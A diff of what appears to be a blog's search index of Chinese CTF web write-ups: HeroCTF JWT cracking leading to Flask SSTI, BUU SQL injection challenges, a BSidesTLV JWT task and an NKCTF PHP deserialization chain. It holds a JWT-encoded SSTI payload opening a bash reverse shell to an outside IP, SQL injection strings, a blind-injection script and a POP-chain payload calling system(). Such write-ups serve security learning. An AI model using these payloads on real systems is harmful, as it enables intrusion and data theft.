@@ -141,6 +141,56 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Drink from my Flask#1(HeroCTF 2023)</title>
+    <url>/2023/05/15/Drink%20from%20my%20Flask#1(HeroCTF%202023)/</url>
+    <content><![CDATA[<p>Drink from my Flask#1(HeroCTF 2023)</p>
+<span id="more"></span>
+
+<p>![image-20230515193407724](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515193407724.png)</p>
+<p>输入试试</p>
+<p>![image-20230515193427263](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515193427263.png)</p>
+<p>访问&#x2F;admin，显示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin was not found</span><br><span class="line"></span><br><span class="line">Only routes / and /adminPage are available</span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;adminPage</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry but you can&#x27;t access this page, you&#x27;re a &#x27;guest&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>看cookie</p>
+<p>![image-20230515194034852](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515194034852.png)</p>
+<p>是jwt</p>
+<p>![image-20230515194050770](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515194050770.png)</p>
+<p>但是没有密钥，使用jwt_tool暴力破解</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&quot; -C -d /jwt-common.txt</span><br></pre></td></tr></table></figure>
+
+<p>![image-20230515195020292](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195020292.png)</p>
+<p>得到密钥是key，进行伪造</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&quot; -T -S hs256 -p &quot;key&quot;</span><br></pre></td></tr></table></figure>
+
+<p>![image-20230515195255107](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195255107.png)</p>
+<p>将cookie换成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.AVjKNp3JWkmYQdHzpEVpAU9pfGSiwJykT3lbWpQYhMY</span><br></pre></td></tr></table></figure>
+
+<p>刷新网页</p>
+<p>![image-20230515195334276](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195334276.png)</p>
+<p>再伪造一个</p>
+<p>![image-20230515195508165](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195508165.png)</p>
+<p>cookie换成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3s3Kjd9fSJ9.z__5DxmRbygPH1em02OyYj1Zt0GUbIk_zRoQ2twuzU8</span><br></pre></td></tr></table></figure>
+
+<p>![image-20230515195534813](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195534813.png)</p>
+<p>有ssti</p>
+<p>再伪造命令执行</p>
+<p>![image-20230515195835660](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195835660.png)</p>
+<p>使用cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2Jhc2ggLWMgXFxcImJhc2ggLWkgPiYgL2Rldi90Y3AvNDMuMTQzLjE1NS45MC8xMjM0IDA-JjFcXFwiJykucmVhZCgpfX0ifQ.ZqhpjUrt2W8_A7VKiG42i7un4gB7oyB5fL6hUaN1-QI</span><br></pre></td></tr></table></figure>
+
+<p>使用云服务器监听1234端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>![image-20230515200013911](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515200013911.png)</p>
+]]></content>
+  </entry>
+  <entry>
     <title>DASCTF X GFCTF 2022的web部分解题</title>
     <url>/2023/04/16/DASCTF%20X%20GFCTF%202022/</url>
     <content><![CDATA[<p>EasyPOP	EasyLove</p>
@@ -210,134 +260,6 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date -f 可以打开指定文件</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2023/04/16/DASCTF%20X%20GFCTF%202022/image-20230416210724321.png" alt="image-20230416210724321"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Drink from my Flask#1(HeroCTF 2023)</title>
-    <url>/2023/05/15/Drink%20from%20my%20Flask#1(HeroCTF%202023)/</url>
-    <content><![CDATA[<p>Drink from my Flask#1(HeroCTF 2023)</p>
-<span id="more"></span>
-
-<p>![image-20230515193407724](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515193407724.png)</p>
-<p>输入试试</p>
-<p>![image-20230515193427263](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515193427263.png)</p>
-<p>访问&#x2F;admin，显示</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin was not found</span><br><span class="line"></span><br><span class="line">Only routes / and /adminPage are available</span><br></pre></td></tr></table></figure>
-
-<p>访问&#x2F;adminPage</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry but you can&#x27;t access this page, you&#x27;re a &#x27;guest&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>看cookie</p>
-<p>![image-20230515194034852](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515194034852.png)</p>
-<p>是jwt</p>
-<p>![image-20230515194050770](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515194050770.png)</p>
-<p>但是没有密钥，使用jwt_tool暴力破解</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&quot; -C -d /jwt-common.txt</span><br></pre></td></tr></table></figure>
-
-<p>![image-20230515195020292](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195020292.png)</p>
-<p>得到密钥是key，进行伪造</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&quot; -T -S hs256 -p &quot;key&quot;</span><br></pre></td></tr></table></figure>
-
-<p>![image-20230515195255107](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195255107.png)</p>
-<p>将cookie换成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.AVjKNp3JWkmYQdHzpEVpAU9pfGSiwJykT3lbWpQYhMY</span><br></pre></td></tr></table></figure>
-
-<p>刷新网页</p>
-<p>![image-20230515195334276](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195334276.png)</p>
-<p>再伪造一个</p>
-<p>![image-20230515195508165](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195508165.png)</p>
-<p>cookie换成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3s3Kjd9fSJ9.z__5DxmRbygPH1em02OyYj1Zt0GUbIk_zRoQ2twuzU8</span><br></pre></td></tr></table></figure>
-
-<p>![image-20230515195534813](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195534813.png)</p>
-<p>有ssti</p>
-<p>再伪造命令执行</p>
-<p>![image-20230515195835660](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515195835660.png)</p>
-<p>使用cookie</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2Jhc2ggLWMgXFxcImJhc2ggLWkgPiYgL2Rldi90Y3AvNDMuMTQzLjE1NS45MC8xMjM0IDA-JjFcXFwiJykucmVhZCgpfX0ifQ.ZqhpjUrt2W8_A7VKiG42i7un4gB7oyB5fL6hUaN1-QI</span><br></pre></td></tr></table></figure>
-
-<p>使用云服务器监听1234端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nlvp 1234</span><br></pre></td></tr></table></figure>
-
-<p>![image-20230515200013911](Drink from my Flask#1(HeroCTF 2023)&#x2F;image-20230515200013911.png)</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>buu的SQL</title>
-    <url>/2022/12/03/SQL%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
-    <content><![CDATA[<p>[极客大挑战 2019]LoveSQL	[极客大挑战 2019]BabySQL	[极客大挑战 2019]HardSQL	[GXYCTF2019]BabySQli	[CISCN2019 华北赛区 Day2 Web1]Hack World</p>
-<span id="more"></span>
-
-<h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>1.先使用万能密码1’ or 1&#x3D;1#进行尝试查看是否有回显，查看存在回显</p>
-<p>2.查看字段数，使用order by或者union select，因为是在http行进行的输入#注释无法使用，所以使用%23来进行注释</p>
-<p>3.经过试验有3个字段，然后进行联合注入即可</p>
-<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>1.经过试验存在union，select，or，注释符，and，from，where及其他过滤，但是可以使用%23进行注释，这里可以都是用双写绕过</p>
-<p>2.使用万能密码，存在回显</p>
-<p>3.使用联合注入check.php?username&#x3D;1’ ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata%23&amp;password&#x3D;123来爆出所有的库</p>
-<p>4.选用ctf库，进行爆表名为flag，再爆字段也为flag</p>
-<p>5.最后爆数据</p>
-<h3 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h3><p>1.存在空格，union，and，&#x3D;，过滤</p>
-<p>2.使用报错型注入，注入时的语句不可以带有空格，使用check.php?username&#x3D;1&amp;password&#x3D;1’or(extractvalue(1,concat(0x7e,(select(database())))))%23来爆出数据库</p>
-<p>3.然后继续使用报错型注入来爆表，字段，</p>
-<p>4.获得数据时flag无法显示完全，使用left()和right()函数来获得全部数据，例如group_concat(right(password,32))</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left()和right()函数用法</span><br><span class="line">LEFT (input_string , number_of_characters)</span><br><span class="line">input_string可以是文字字符串，变量或列。</span><br><span class="line">number_of_characters是一个正整数，指定将返回input_string的字符数。</span><br></pre></td></tr></table></figure>
-
-<h3 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h3><p>1.存在()过滤，使用union盲注</p>
-<h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p>1.该关是盲注，并且存在过滤，打开网页上已经提示flag在flag表的flag列</p>
-<p>2.输入1发现返回Hello, glzjin wants a girlfriend.输入2返回Do you want to be my girlfriend?</p>
-<p>3.利用1和2返回的值进行构造if(substr((select(flag)from(flag)),1,1)&#x3D;’’,1,2)如果正确就会返回输入1时的内容，不正确就会返回输入2时的内容</p>
-<p>4.然后写盲注脚本(有点小问题)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&#x27;:</span><br><span class="line">        url=&quot;http://473b566b-93a5-4ae6-b850-b77390a9dc6a.node4.buuoj.cn:81&quot;</span><br><span class="line">        sqls=&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;),1,2)&quot;.format(i,j)</span><br><span class="line">        data=&#123;&quot;id&quot;:sqls&#125;</span><br><span class="line">        c = s.post(url,data=data)</span><br><span class="line">        if &#x27;Hello&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-]]></content>
-  </entry>
-  <entry>
-    <title>My Vouchers Repo(BSidesTLV 2023 CTF)</title>
-    <url>/2023/07/04/%5BBSidesTLV%202023%20CTF%5DMy%20Vouchers%20Repo/</url>
-    <content><![CDATA[<p>My Vouchers Repo</p>
-<span id="more"></span>
-
-<meta name="referrer" content="no-referrer">
-
-<p>打开页面就是一个登录和注册界面</p>
-<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162249810.png" alt="image-20230628162249810"></p>
-<p>那就先注册一个，一个是home界面，还有一个是优惠卷界面</p>
-<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162320815.png" alt="image-20230628162320815"></p>
-<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162356398.png" alt="image-20230628162356398"></p>
-<p>根据题目给你信息，应该是要登录用户名为<code>john</code>的用户，然后在源代码处的<code>[main.eb04397cc22cdfc5.js](https://my-voucher-repo.ctf.bsidestlv.com/main.eb04397cc22cdfc5.js)</code>中看到</p>
-<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628162544646.png" alt="image-20230628162544646"></p>
-<p>这样知道了是在header头<code>Authorization</code>处有用户登录信息，然后就是想办法伪造一个用户名是<code>john</code>的用户，这个是jwt，但是找不到密钥，还在源代码中找到一个api接口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/signin</span><br><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/vouchers</span><br></pre></td></tr></table></figure>
-
-<p>扫描目录发现还有一个<code>api/v1</code>接口，但是显示<code>not found</code>，接下来就不会做了，然后就看别人给的hint，发现api&#x2F;v1是可以打开的</p>
-<p><img src="https://gitee.com/emmm159/images/raw/master/img/image-20230628163909724.png" alt="image-20230628163909724"></p>
-<p>这个有一个<code>/refresh_token</code>，所以在url为一下界面</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v1/refresh_token</span><br></pre></td></tr></table></figure>
-
-<p>使用json传</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;john&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样可以回显一个用户名为john的token，然后在url</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://my-voucher-repo.ctf.bsidestlv.com/api/v2/vouchers</span><br></pre></td></tr></table></figure>
-
-<p>header头中的<code>Authorization</code>中输入<code>Bearer 用户名为john的token</code>就可以得到flag</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Typora用法</title>
-    <url>/2022/10/04/Typora%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<p>Typora基本用法</p>
-<span id="more"></span>
-
-<h6 id="1-标题快捷键是ctrl-数字"><a href="#1-标题快捷键是ctrl-数字" class="headerlink" title="1.标题快捷键是ctrl+数字"></a>1.标题快捷键是ctrl+数字</h6><h6 id="2-让字体居中显示"><a href="#2-让字体居中显示" class="headerlink" title="2.让字体居中显示"></a>2.让字体居中显示</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;center&gt;居中&lt;/center&gt;</span><br><span class="line">&lt;p align=&quot;left&quot;&gt;左对齐&lt;/p&gt;</span><br><span class="line">&lt;p align=&quot;right&quot;&gt;右对齐&lt;/p&gt;</span><br></pre></td></tr></table></figure>
-
-<h6 id="3-修改字体颜色"><a href="#3-修改字体颜色" class="headerlink" title="3.修改字体颜色"></a>3.修改字体颜色</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;font color=颜色代码 size=字号 face=&quot;字体名称&quot;&gt;文本&lt;/font&gt;</span><br></pre></td></tr></table></figure>
-
-<p>红色的代码是#ff0000</p>
-<h6 id="4-插入图片的语法是"><a href="#4-插入图片的语法是" class="headerlink" title="4.插入图片的语法是"></a>4.插入图片的语法是</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![](这里是图片所在的文件)</span><br></pre></td></tr></table></figure>
-
-<h6 id="5-设置链接是直接将链接写入"><a href="#5-设置链接是直接将链接写入" class="headerlink" title="5.设置链接是直接将链接写入"></a>5.设置链接是直接将链接写入</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;www.baidu.com&gt;</span><br></pre></td></tr></table></figure>
-
-<h6 id="6-常用快捷键"><a href="#6-常用快捷键" class="headerlink" title="6.常用快捷键"></a>6.常用快捷键</h6><p><img src="/2022/10/04/Typora%E7%94%A8%E6%B3%95/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p>
 ]]></content>
   </entry>
   <entry>
@@ -716,77 +638,6 @@
 <h6 id="31-more命令和less命令（分屏显示指定文件的内容）"><a href="#31-more命令和less命令（分屏显示指定文件的内容）" class="headerlink" title="31.more命令和less命令（分屏显示指定文件的内容）"></a>31.more命令和less命令（分屏显示指定文件的内容）</h6><h6 id="32-which命令（显示命令的绝对路径）"><a href="#32-which命令（显示命令的绝对路径）" class="headerlink" title="32.which命令（显示命令的绝对路径）"></a>32.which命令（显示命令的绝对路径）</h6>]]></content>
   </entry>
   <entry>
-    <title>2023 nkctf的web部分解题</title>
-    <url>/2023/03/29/nkctf%20web/</url>
-    <content><![CDATA[<p>反序列化和绕过强，弱比较</p>
-<span id="more"></span>
-
-<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>1.首先是源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;ItS SO CREAZY&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;arg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$string</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you are bad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$shell</span> = <span class="variable language_">$this</span>-&gt;shell;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>有unserialize()函数，一看就是一个反序列化，还有__destruct()函数，使用反序列化函数时会自动调用这个函数</p>
-<p>2.这道题的pop链逻辑比较简单，使用的魔术方法也比较少</p>
-<p>直接来构造pop链</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unserialize() =&gt; __destruct() -&gt; $arg =&gt; __toString() -&gt; $func =&gt; __invoke() -&gt; eval($shell($cmd))</span><br></pre></td></tr></table></figure>
-
-<p>直接上payload</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;welcome_to_NKCTF&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;more /[e-h][k-m][0-b][e-h]&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$we</span>=<span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$ha</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$ho</span>=<span class="keyword">new</span> <span class="title class_">Hell0</span>();</span><br><span class="line"><span class="variable">$we</span>-&gt;arg=<span class="variable">$ho</span>;</span><br><span class="line"><span class="variable">$we</span>-&gt;arg-&gt;func=<span class="variable">$ha</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$we</span>));</span><br></pre></td></tr></table></figure>
-
-<p>3.这里主要的难点是一个正则匹配</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$string</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you are bad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这个正则匹配的意思是匹配f，l，a，g，*，?这几个字符，并且不区分大小写，</p>
-<p>读取flag文件，通常会使用cat，但是cat中含有a字符，可以用more来代替cat</p>
-<p>接下来就是考虑可以用什么来代替flag，这里看wp知道glob通配符</p>
-<p>看ascii码表，f位于e和h之间，l位于k和m之间，a可以当成在0和b之间，g在e和h之间</p>
-<p><img src="/2023/03/29/nkctf%20web/image-20230403210845208.png" alt="image-20230403210845208"></p>
-<p>所以flag可以使用<code>[e-h][k-m][0-b][e-h]</code>来代替</p>
-<h2 id="绕过强，弱比较"><a href="#绕过强，弱比较" class="headerlink" title="绕过强，弱比较"></a>绕过强，弱比较</h2><p>1.上源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>] != (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>] != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>]) == <span class="number">114514</span>)&#123;</span><br><span class="line"><span class="comment">//            phpinfo();</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NS_CTF.go&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//                phpinfo();</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&#x27;error!!!!!!&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;error!!!!!&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;error!!!!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error!!&#x27;</span>);</span><br><span 